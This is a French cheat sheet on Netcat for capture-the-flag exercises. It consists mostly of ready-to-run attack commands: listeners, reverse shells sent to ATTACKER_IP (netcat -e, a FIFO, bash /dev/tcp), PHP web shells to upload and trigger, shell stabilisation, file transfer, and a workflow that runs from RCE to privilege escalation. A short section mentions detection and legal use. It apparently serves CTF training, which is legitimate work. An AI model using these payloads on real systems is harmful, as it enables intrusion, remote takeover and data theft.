# Netcat (nc) – Spécial CTF 🔥

## 🎯 Objectif en CTF
Netcat est principalement utilisé pour :
- Récupérer un reverse shell
- Stabiliser un shell
- Transférer des fichiers
- Tester des services rapidement
- Exploiter une RCE (souvent via PHP)

---

# 🧭 1️⃣ Reverse Shell Classique

## 🎧 Attaquant (Kali)
nc -lvp 4444

## 🖥️ Victime
nc ATTACKER_IP 4444 -e /bin/bash

⚠️ Souvent -e est désactivé → voir méthode sans -e.

---

# 🔄 Reverse Shell sans -e (méthode FIFO)

rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

---

# 🐚 Stabiliser un Shell (Important en CTF)

Une fois connecté :

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo
fg

→ Permet d’avoir un shell interactif propre.

---

# 🌐 Partie PHP – Reverse Shell

## 📌 Reverse shell PHP simple

<?php system("nc ATTACKER_IP 4444 -e /bin/bash"); ?>

---

## 📌 Si -e ne fonctionne pas

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>

---

## 📌 Reverse Shell PHP pur (sans netcat côté victime)

<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>

---

# 🧪 Exécution via upload (cas CTF courant)

1. Upload d’un fichier shell.php
2. Lancer listener :
   nc -lvp 4444
3. Accéder à :
   http://target.com/uploads/shell.php

---

# 📁 Transfert de fichiers en CTF

## Recevoir
nc -lvp 4444 > linpeas.sh

## Envoyer depuis la cible
nc ATTACKER_IP 4444 < linpeas.sh

---

# 🔎 Test rapide de service

echo "GET / HTTP/1.1" | nc target.com 80

---

# 🧠 Tips CTF importants

- Toujours vérifier si nc est présent :
  which nc

- Tester versions :
  nc -h

- Alternatives si absent :
  - bash /dev/tcp
  - python reverse shell
  - perl reverse shell

- Vérifier egress filtering (port 80 / 443 souvent autorisés)

---

# 🚀 Ports populaires en CTF
4444
9001
1337
8080
443

---

# 🛑 Défense (culture pro AIS)

Netcat peut être détecté par :
- EDR
- Antivirus
- IDS/IPS

Toujours utilisation légale.

---

# 🧩 Workflow CTF typique

1️⃣ RCE via injection / upload PHP  
2️⃣ Lancer nc -lvp 4444  
3️⃣ Déclencher le reverse shell  
4️⃣ Stabiliser le shell  
5️⃣ Escalade de privilèges  

---

## 🔥 Résumé rapide

Netcat en CTF =  
🎯 Capture shell  
🛠 Stabilisation  
📁 Transfert  
🔄 Pivot  
